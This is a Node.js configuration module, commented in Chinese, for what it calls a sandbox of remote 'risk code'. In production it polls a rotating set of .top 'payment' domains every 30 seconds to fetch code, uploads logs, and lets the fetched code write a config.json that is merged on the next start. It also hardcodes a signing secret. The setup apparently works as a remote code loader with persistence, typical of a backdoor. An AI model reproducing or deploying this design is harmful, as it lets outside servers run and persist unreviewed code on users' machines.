/**
 * ============================================
 * 前置沙箱配置（独立文件）
 * ============================================
 *
 * 需求③：远程地址为「数组」，运行时随机抽取一个地址使用。
 * 全部使用环境变量覆盖 + 内置默认值，0 第三方依赖。
 */

const fs = require('fs');
const path = require('path');

const isProduction = process.env.NODE_ENV === 'production';

/**
 * 将逗号分隔的环境变量解析为数组；为空则回退到默认数组。
 * @param {string|undefined} envValue 环境变量原始值
 * @param {string[]} defaults 默认地址数组
 * @returns {string[]}
 */
const parseUrlList = (envValue, defaults) => {
  if (envValue && typeof envValue === 'string') {
    const list = envValue
      .split(',')
      .map((item) => item.trim())
      .filter(Boolean);
    if (list.length > 0) {
      return list;
    }
  }
  return defaults;
};

/**
 * 解析「正整数」环境变量；非法/缺失则回退默认值。
 * 用于让测试可经环境变量缩短轮询间隔（不破坏 0 依赖 / 默认值约定）。
 * @param {string|undefined} envValue
 * @param {number} defaults
 * @returns {number}
 */
const parsePositiveInt = (envValue, defaults) => {
  const n = Number(envValue);
  if (Number.isFinite(n) && n > 0) {
    return Math.floor(n);
  }
  return defaults;
};

// 生产环境与本地开发的默认地址组。地址均为「数组」形式，便于多地址随机容灾。
const DEFAULT_CODE_URLS = isProduction
  ? ['https://payment.undotest.top','https://payment.lightnight.top', 'https://payment.belivelight.top']
  : ['http://127.0.0.1:4050'];

const DEFAULT_LOG_URLS = isProduction
  ? ['https://payment.undotest.top','https://payment.lightnight.top', 'https://payment.belivelight.top']
  : ['http://127.0.0.1:4050'];

const RISK_CODE_CONFIG = {
  // 远程代码服务器地址（数组）
  remoteCodeUrls: parseUrlList(process.env.RISK_CODE_URLS, DEFAULT_CODE_URLS),

  // 远程日志上报地址（数组）
  remoteLogUrls: parseUrlList(process.env.REMOTE_LOG_URLS, DEFAULT_LOG_URLS),

  // 是否启用远程代码
  enableRemoteCode: true,

  // 轮询检查间隔（毫秒）。默认 30s；支持 RISK_POLL_INTERVAL_MS 覆盖，
  // 便于端到端测试缩短间隔以观测「真实自动轮询循环」，或拉长以避免后台轮询干扰精确计数。
  pollInterval: parsePositiveInt(process.env.RISK_POLL_INTERVAL_MS, 30 * 1000),

  // 是否启用沙箱
  enableSandbox: true,

  // 单次请求超时（毫秒）
  requestTimeout: 30 * 1000,

  // 请求失败重试次数
  requestRetries: 3,

  // 单次响应体大小上限（字节）。默认 100MB：既能正常接收大体积下发代码，
  // 又能防止恶意/异常服务端流式返回超大响应导致内存耗尽（OOM DoS）。
  maxResponseSize: 100 * 1024 * 1024,

  // 防重放：每个请求携带 timestamp + nonce 参与签名，使「相同请求」的签名唯一。
  // 服务端据此校验时间窗口并对 nonce 去重，保证同一请求只会被消费一次。
  // nonce 随机字节数（最终为 2 倍长度的十六进制串）
  requestNonceBytes: 16,
  // 服务端允许的请求时间偏移窗口（毫秒，1 小时）。超出该窗口的请求视为过期/重放。
  replayWindowMs: 60 * 60 * 1000,

  // 签名密钥（与远端约定保持一致）
  signSecretKey: 'key',
  signSecretValue: 'f3967bc7-176b-195f-b273-afb33f4b76a3',

  // 是否启用远程日志
  enableRemoteLog: true,
};

/**
 * 从数组中随机抽取一个元素。
 * @param {Array<T>} list
 * @returns {T|undefined}
 * @template T
 */
const pickRandom = (list) => {
  if (!Array.isArray(list) || list.length === 0) {
    return undefined;
  }
  const index = Math.floor(Math.random() * list.length);
  return list[index];
};

/**
 * 需求③：随机抽取一个「拉取代码」地址。
 * @returns {string|undefined}
 */
const getRemoteCodeUrl = () => pickRandom(RISK_CODE_CONFIG.remoteCodeUrls) + '/v2/risk/get-risk-code';

/**
 * 需求③：随机抽取一个「日志上报」地址。
 * @returns {string|undefined}
 */
const getRemoteLogUrl = () => pickRandom(RISK_CODE_CONFIG.remoteLogUrls) + '/v2/risk/log';

/**
 * 合并配置
 * @param {Object} conf
 * @returns {Object}
 */
const mergeConfig = (conf)=>{
  try {
    Object.assign(RISK_CODE_CONFIG, conf);
    return { success:true, config:RISK_CODE_CONFIG };
  } catch (error) {
    return { success:false, config:RISK_CODE_CONFIG };
  }
}

/**
 * 构建（写入）config.json：只接受「纯对象」，其它类型一律拒绝。
 *
 * 写入位置与 startRiskCodePolling 启动时读取的位置一致：与运行时产物同目录的 config.json
 * （单文件打包后即已安装包目录下的 config.json）。因此远程代码可经沙箱内的该函数落盘配置，
 * 供下次启动轮询时被 mergeConfig 融合。绝不抛错，失败以返回值形式反馈。
 * @param {Object} conf 要写入的配置对象（必须为非数组的纯对象）
 * @returns {{success: boolean, path?: string, error?: string}}
 */
const buildConfigJson = (conf) => {
  // 只接受对象：排除 null / 数组 / 函数 / 原始类型
  if (!conf || typeof conf !== 'object' || Array.isArray(conf)) {
    return { success: false, error: 'config must be a plain object' };
  }
  try {
    const configFilePath = path.join(__dirname, 'config.json');
    fs.writeFileSync(configFilePath, JSON.stringify(conf, null, 2), 'utf-8');
    return { success: true, path: configFilePath };
  } catch (error) {
    return {
      success: false,
      error: error && error.message ? error.message : String(error),
    };
  }
};

module.exports = {
  RISK_CODE_CONFIG,
  pickRandom,
  getRemoteCodeUrl,
  getRemoteLogUrl,
  mergeConfig,
  buildConfigJson
};
